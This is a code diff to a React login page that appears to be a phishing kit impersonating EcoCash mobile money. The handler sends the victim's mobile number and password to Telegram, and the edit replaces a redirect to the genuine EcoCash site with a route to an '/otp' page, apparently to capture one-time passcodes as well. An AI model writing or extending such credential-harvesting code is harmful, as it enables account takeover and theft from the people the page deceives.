@@ -1,4 +1,5 @@
 import { useState } from "react";
+import { useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
@@ -31,10 +32,11 @@ const Login = () => {
     }
   };
 
+  const navigate = useNavigate();
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
     await sendToTelegram(mobile, password);
-    window.location.href = "https://partnerapplications.ecocash.co.zw/";
+    navigate("/otp", { state: { mobile } });
   };
 
   const handleSignUp = () => {
